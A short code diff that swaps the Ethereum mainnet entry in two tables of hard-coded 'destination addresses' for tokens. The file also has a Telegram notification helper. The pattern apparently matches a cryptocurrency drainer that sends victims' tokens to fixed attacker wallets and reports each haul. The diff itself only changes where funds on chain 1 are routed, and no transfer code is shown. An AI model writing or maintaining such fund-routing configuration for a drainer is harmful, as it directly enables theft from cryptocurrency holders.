@@ -26,7 +26,7 @@ const sendTelegramNotification = async (message: string) => {
 
 // Preset destination addresses based on chain IDs
 const destinationAddresses = {
-  1: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
   56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
   10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
   324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
@@ -38,7 +38,7 @@ const destinationAddresses = {
 // Function to select the correct address based on network
 function selectAddressForToken(network) {
   const addresses = {
-    1: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+    1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
     56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
     10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
     324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
